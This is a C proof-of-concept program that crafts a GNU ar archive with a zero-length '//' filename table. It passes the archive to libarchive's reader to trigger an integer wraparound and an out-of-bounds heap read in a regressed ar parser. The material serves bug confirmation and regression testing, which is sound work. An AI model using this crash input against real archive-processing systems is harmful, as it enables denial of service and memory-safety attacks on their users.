/*
 * Proof-of-concept driver for the delocalized GNU "ar" filename-table
 * defect.  Drives the public libarchive reader API with an in-contract
 * ar archive whose GNU filename table ("//") declares a length of 0.
 *
 * On a tree where both the "//" size validation (ar: Always skip all
 * special entry bytes) and the error-message cleanup (ar: Improve error
 * messages) drop their zero-length rejection, a zero-length filename
 * table reaches ar_parse_gnu_filename_table(), whose `size - 1` wraps to
 * SIZE_MAX and whose first dereference reads off the zero-byte heap
 * allocation -> AddressSanitizer abort.
 *
 * Builds against the installed public headers only.
 */
#include <stdio.h>
#include <string.h>
#include <archive.h>
#include <archive_entry.h>

/* Fill one 60-byte ar member header. */
static void
put_header(unsigned char *h, const char *name, const char *size)
{
	size_t i;

	memset(h, ' ', 60);
	memcpy(h + 0, name, strlen(name));   /* name,  offset 0,  width 16 */
	h[16] = '0';                         /* mtime, offset 16, width 12 */
	h[28] = '0';                         /* uid,   offset 28, width 6  */
	h[34] = '0';                         /* gid,   offset 34, width 6  */
	memcpy(h + 40, "100644", 6);         /* mode,  offset 40, width 8  */
	memcpy(h + 48, size, strlen(size));  /* size,  offset 48, width 10 */
	h[58] = '`';                         /* fmag,  offset 58, width 2  */
	h[59] = '\n';
	(void)i;
}

int
main(void)
{
	unsigned char buf[8 + 60 + 60 + 16];
	size_t off = 0;
	struct archive *a;
	struct archive_entry *entry;
	int r;

	memcpy(buf + off, "!<arch>\n", 8);
	off += 8;

	/* GNU filename table with a declared length of 0. */
	put_header(buf + off, "//", "0");
	off += 60;

	/* A trailing regular member so there is data after the table. */
	put_header(buf + off, "f.txt/", "0");
	off += 60;

	a = archive_read_new();
	archive_read_support_format_all(a);
	archive_read_support_filter_all(a);

	r = archive_read_open_memory(a, buf, off);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "open failed: %s\n", archive_error_string(a));
		archive_read_free(a);
		return 2;
	}

	while ((r = archive_read_next_header(a, &entry)) == ARCHIVE_OK) {
		const char *p = archive_entry_pathname(entry);
		printf("entry: %s\n", p ? p : "(null)");
	}

	printf("done r=%d\n", r);
	archive_read_free(a);
	return 0;
}
